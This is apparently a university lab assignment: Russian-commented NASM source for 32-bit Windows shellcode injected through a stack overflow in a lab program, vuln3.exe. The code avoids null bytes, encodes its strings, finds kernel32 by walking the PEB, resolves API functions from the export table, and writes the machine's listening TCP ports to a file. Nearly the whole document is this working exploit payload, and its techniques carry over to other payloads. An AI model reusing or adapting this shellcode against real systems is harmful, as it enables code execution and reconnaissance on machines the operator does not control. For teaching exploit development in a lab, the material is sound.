; ============================================================================
;  Лабораторная работа № 2, вариант 3.
;  Полезная нагрузка на ассемблере: записать в файл номера открытых
;  (слушающих) TCP-портов.
;
;  Только WinAPI, без запуска программ и консольных команд:
;    * kernel32.dll находится по списку загруженных модулей
;      (PEB -> PEB_LDR_DATA -> InLoadOrderModuleList -> ntdll -> kernelbase ->
;      kernel32);
;    * в её таблице экспорта по имени ищется только GetProcAddress;
;    * через GetProcAddress берутся CreateFileA, WriteFile, LoadLibraryA,
;      затем загружается iphlpapi.dll и берётся оттуда GetTcpTable;
;    * таблица слушающих сокетов разбирается, номера портов пишутся в файл
;      ports.txt по одному в строке.
;
;  Ограничения (измерены на vuln3.exe):
;    * payload не должен содержать нулевых байтов - его копирует строковая
;      функция, и первый же 00 обрывает копирование;
;    * длина shellcode не должна превышать ~740 байт, иначе срабатывает
;      защита стека и процесс падает с 0xC0000409 / 0xC0000005.
;
;  Приёмы, дающие компактность и отсутствие нулей:
;    * строки кладутся в стек закодированными сдвигом +41h и декодируются на
;      месте, поэтому нулевых терминаторов в файле нет;
;    * константы собираются через xor / mov reg8 / shl, а не как imm32;
;    * все смещения локальных данных меньше 80h (короткие disp8);
;    * вызовы WinAPI - stdcall, стек чистит сама функция.
;
;  Сборка:  nasm -f bin -o payload_asm.bin sc.asm
; ============================================================================

BITS 32

; --- слоты кадра (все < 80h) ------------------------------------------------
%define  V_GPA        0x00     ; адрес GetProcAddress
%define  V_CREATE     0x04     ; адрес CreateFileA
%define  V_WRITE      0x08     ; адрес WriteFile
%define  V_TCPTBL     0x0C     ; адрес GetTcpTable
%define  V_SIZE       0x10     ; pdwSize
%define  V_HFILE      0x14     ; hFile
%define  V_WRITTEN    0x18     ; lpNumberOfBytesWritten
%define  V_ROW        0x1C     ; текущая строка таблицы
%define  V_END        0x20     ; счётчик оставшихся строк
%define  V_TBL        0x24     ; указатель на таблицу TCP
%define  V_STR        0x28     ; база декодированных строк
%define  V_MOD        0x2C     ; база kernel32.dll
%define  B_OUT        0x30     ; буфер вывода: номера портов через CRLF

%define  STR_WORDS    26       ; слов в закодированном блоке строк

; --- смещения строк от базы строк ------------------------------------------
%define  S_PORTS      0x00     ; "ports.txt"
%define  S_IPH        0x0C     ; "iphlpapi.dll"
%define  S_CF         0x1C     ; "CreateFileA"
%define  S_WF         0x28     ; "WriteFile"
%define  S_LLA        0x34     ; "LoadLibraryA"
%define  S_GPA        0x44     ; "GetProcAddress"
%define  S_GCT        0x54     ; "GetTcpTable"

%define  TCPROW_SIZE     20    ; MIB_TCPROW
%define  TCPROW_PORT     8     ; dwLocalPort
%define  TCPSTATE_LISTEN 2


; ----------------------------------------------------------------------------
; LOOKUP <слот>, <смещение строки>, <длина имени>
;   Ищет функцию в таблице экспорта модуля (EBP = база модуля) и кладёт
;   её адрес в слот кадра.
;
;   На стеке после четырёх push'ей:
;     [esp+0]  число имён, [esp+4] таблица адресов,
;     [esp+8]  таблица имён, [esp+12] таблица ординалов.
; ----------------------------------------------------------------------------
%macro LOOKUP 3
    mov  eax, [ebp + 3Ch]                       ; e_lfanew
    add  eax, ebp
    mov  eax, [eax + 78h]                       ; RVA таблицы экспорта
    add  eax, ebp
    mov  esi, [eax + 1Ch]                       ; RVA таблицы адресов
    add  esi, ebp
    mov  edi, [eax + 20h]                       ; RVA таблицы имён
    add  edi, ebp
    mov  ebx, [eax + 24h]                       ; RVA таблицы ординалов
    add  ebx, ebp
    push ebx                                    ; [esp+12] ординалы
    push edi                                    ; [esp+8]  имена
    push esi                                    ; [esp+4]  адреса
    push dword [eax + 18h]                      ; [esp+0]  число имён
    xor  esi, esi                               ; индекс имени
%%loop:
    mov  edi, [esp + 8]                         ; таблица имён
    mov  edi, [edi + esi*4]                     ; RVA очередного имени
    add  edi, ebp                               ; -> имя
    push esi
    push edi
    mov  esi, [esp + 24 + V_STR]                ; база строк
    add  esi, %2                                ; -> искомая строка
    push %3
    pop  ecx
    cld
    repe cmpsb
    pop  edi
    pop  esi
    jz   %%found
    inc  esi
    cmp  esi, [esp]                             ; число имён
    jb   %%loop
    xor  eax, eax
    jmp  %%done
%%found:
    mov  edi, [esp + 12]                        ; таблица ординалов
    movzx eax, word [edi + esi*2]               ; ординал имени
    mov  edi, [esp + 4]                         ; таблица адресов
    mov  eax, [edi + eax*4]                     ; RVA функции
    add  eax, ebp
%%done:
    add  esp, 10h
    mov  [esp + %1], eax
%endmacro


; ============================================================================
;  ТОЧКА ВХОДА: jmp esp попадает сюда, поэтому сразу переходим к телу.
; ============================================================================
shellcode:
    jmp  short body

; ----------------------------------------------------------------------------
; DEC: EAX (0..65535) -> десятичные цифры в буфер по адресу EDI.
; ----------------------------------------------------------------------------
DEC:
    mov  ebx, esp
    push 0Ah
    pop  ecx                                    ; делитель 10
.d:
    xor  edx, edx
    div  ecx
    push edx
    mov  edx, ebx
    sub  edx, esp
    cmp  edx, 24                                ; не больше 6 цифр
    ja   .digits
    test eax, eax
    jnz  .d
.digits:
    cmp  esp, ebx
    jz   .done
    pop  eax
    add  al, '0'
    mov  [edi], al
    inc  edi
    jmp  .digits
.done:
    ret

; ----------------------------------------------------------------------------
body:
    ; ------------------------------------------------------------------
    ; 1. Строки в стек (закодированы +41h) и декодирование на месте.
    ;    Порядок push'ей обратный: последняя строка ложится выше всех.
    ; ------------------------------------------------------------------
    push dword 0x41414141                       ; паддинг после "GetTcpTable"
    push dword 0x41414141
    push dword 0x41A6ADA3                       ; "GetTcpTable"
    push dword 0xA295B1A4
    push dword 0x95B5A688
    push dword 0x8241B4B4                       ; "GetProcAddress"
    push dword 0xA6B3A5A5
    push dword 0x82A4B0B3
    push dword 0x91B5A688
    push dword 0x82828241
    push dword 0x82BAB3A2                       ; "LoadLibraryA"
    push dword 0xB3A3AA8D
    push dword 0xA5A2B08D
    push dword 0x828241A6
    push dword 0xADAA87A6                       ; "WriteFile"
    push dword 0xB5AAB398
    push dword 0x4182A6AD
    push dword 0xAA87A6B5                       ; "CreateFileA"
    push dword 0xA2A6B384
    push dword 0x82828241
    push dword 0xADADA56F                       ; "iphlpapi.dll"
    push dword 0xAAB1A2B1
    push dword 0xADA9B1AA
    push dword 0x828241B5
    push dword 0xB9B56FB4                       ; "ports.txt"
    push dword 0xB5B3B0B1

    mov  edi, esp
    push STR_WORDS
    pop  ecx
decode:
    mov  eax, [edi]
    sub  eax, 0x41414141                        ; снимаем сдвиг +41h
    mov  [edi], eax
    add  edi, 4
    dec  ecx
    jnz  decode

    ; кадр: слоты, буфер вывода, таблица TCP
    push 2
    pop  ecx
    shl  ecx, 12                                ; ECX = 0x2000
    sub  esp, ecx
    mov  eax, esp
    xor  edx, edx
    mov  dh, 20h
    add  eax, edx                               ; EAX = ESP + 0x2000 (строки)
    mov  [esp + V_STR], eax

    ; ==================================================================
    ; 2. База kernel32.dll.
    ;    InLoadOrderModuleList: ntdll -> kernelbase -> kernel32.
    ; ==================================================================
    xor  esi, esi
    mov  eax, [fs:esi + 30h]                    ; PEB
    mov  eax, [eax + 0Ch]                       ; PEB_LDR_DATA
    mov  esi, [eax + 0Ch]                       ; Flink -> первый модуль
    lodsd                                       ; EAX = следующий
    xchg eax, esi                               ; ESI = он же
    lodsd                                       ; EAX = следующий
    xchg eax, esi                               ; ESI = он же -> kernel32
    mov  ebp, [esi + 18h]                       ; DllBase
    mov  [esp + V_MOD], ebp                     ; запомним базу kernel32

    ; ==================================================================
    ; 3. GetProcAddress через таблицу экспорта kernel32.dll.
    ; ==================================================================
    LOOKUP V_GPA, S_GPA, 14
    mov  ebx, [esp + V_GPA]                     ; адрес GetProcAddress
    test ebx, ebx
    jnz  gpa_ok
    int3                                        ; не нашли - сигнал отладчику
gpa_ok:

    ; ==================================================================
    ; 4. Остальные адреса через GetProcAddress.
    ;    EBP - база строк, EDI - база kernel32.
    ; ==================================================================
    mov  ebp, [esp + V_STR]                     ; база строк
    mov  edi, [esp + V_MOD]                     ; база kernel32

    push ebp
    add  dword [esp], S_CF
    push edi
    call ebx                                    ; CreateFileA
    mov  [esp + V_CREATE], eax

    push ebp
    add  dword [esp], S_WF
    push edi
    call ebx                                    ; WriteFile
    mov  [esp + V_WRITE], eax

    push ebp
    add  dword [esp], S_LLA
    push edi
    call ebx                                    ; LoadLibraryA
    mov  esi, eax                               ; адрес LoadLibraryA

    push ebp
    add  dword [esp], S_IPH
    call esi                                    ; LoadLibraryA("iphlpapi.dll")
    mov  edi, eax                               ; HMODULE iphlpapi.dll

    push ebp
    add  dword [esp], S_GCT
    push edi
    call ebx                                    ; GetProcAddress(iphlpapi, ...)
    mov  [esp + V_TCPTBL], eax
    test eax, eax
    jnz  have_tbl
    int3
have_tbl:

    ; ==================================================================
    ; 5. Таблица слушающих сокетов:
    ;    GetTcpTable(pTcpTable, &size, FALSE)
    ;    Строка MIB_TCPROW - 20 байт, состояние +0, порт +8.
    ; ==================================================================
    xor  eax, eax
    mov  ah, 1
    add  eax, esp                               ; EAX = ESP + 0x100
    mov  [esp + V_TBL], eax                     ; pTcpTable
    xor  ecx, ecx
    mov  ch, 10h
    mov  [esp + V_SIZE], ecx                    ; pdwSize = 0x1000
    mov  edx, [esp + V_TCPTBL]
    xor  ecx, ecx
    push ecx                                    ; bOrder = FALSE
    lea  eax, [esp + 4 + V_SIZE]
    push eax                                    ; pdwSize
    push dword [esp + 8 + V_TBL]                ; pTcpTable
    call edx                                    ; stdcall: чистит сам
    test eax, eax
    jz   tcp_ok
    int3                                        ; таблица не получена
tcp_ok:

    ; ==================================================================
    ; 6. Файл отчёта:
    ;    CreateFileA("ports.txt", GENERIC_WRITE, FILE_SHARE_READ, NULL,
    ;                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)
    ; ==================================================================
    mov  edx, [esp + V_CREATE]
    xor  eax, eax
    push eax                                    ; hTemplateFile = NULL
    mov  al, 80h
    push eax                                    ; FILE_ATTRIBUTE_NORMAL
    push 2                                      ; CREATE_ALWAYS
    xor  eax, eax
    push eax                                    ; lpSecurityAttributes = NULL
    push 1                                      ; FILE_SHARE_READ
    xor  eax, eax
    mov  al, 1
    shl  eax, 1Eh                               ; EAX = 40000000h
    push eax                                    ; GENERIC_WRITE
    push dword [esp + 24 + V_STR]               ; lpFileName
    call edx                                    ; stdcall: чистит сам
    cmp  eax, -1                                ; INVALID_HANDLE_VALUE
    jnz  file_ok
    int3                                        ; файл не создан
file_ok:
    mov  [esp + V_HFILE], eax

    ; ==================================================================
    ; 7. Разбор таблицы: состояние +0, порт +8, по одному в строке.
    ; ==================================================================
    mov  eax, [esp + V_TBL]
    mov  ecx, [eax]                             ; dwNumEntries
    mov  [esp + V_END], ecx                     ; счётчик строк
    add  eax, 4                                 ; первая строка
    mov  [esp + V_ROW], eax
    lea  edi, [esp + B_OUT]                     ; EDI -> буфер вывода

nextrow:
    mov  eax, [esp + V_END]                     ; строки кончились?
    test eax, eax
    jz   write_out
    mov  esi, [esp + V_ROW]
    cmp  dword [esi], TCPSTATE_LISTEN
    jnz  rowdone
    mov  ax, [esi + TCPROW_PORT]
    xchg al, ah                                 ; сетевой порядок -> хостовый
    movzx eax, ax                               ; порт целиком (0..65535)
    call DEC                                    ; номер порта -> цифры
    mov  word [edi], 0A0Dh                      ; CRLF после каждого порта
    add  edi, 2
rowdone:
    add  dword [esp + V_ROW], TCPROW_SIZE
    dec  dword [esp + V_END]
    jmp  nextrow

    ; ==================================================================
    ; 8. Одна запись всего буфера в файл.
    ; ==================================================================
write_out:
    lea  eax, [esp + B_OUT]
    mov  ecx, edi
    sub  ecx, eax                               ; длина текста
    jz   finish
    mov  edx, [esp + V_WRITE]
    xor  ebx, ebx
    push ebx                                    ; lpOverlapped = NULL
    lea  ebx, [esp + 4 + V_WRITTEN]
    push ebx                                    ; lpNumberOfBytesWritten
    push ecx                                    ; nNumberOfBytesToWrite
    push eax                                    ; lpBuffer
    push dword [esp + 16 + V_HFILE]             ; hFile
    call edx                                    ; stdcall: чистит сам
finish:
    int3                                        ; файл записан - конец работы
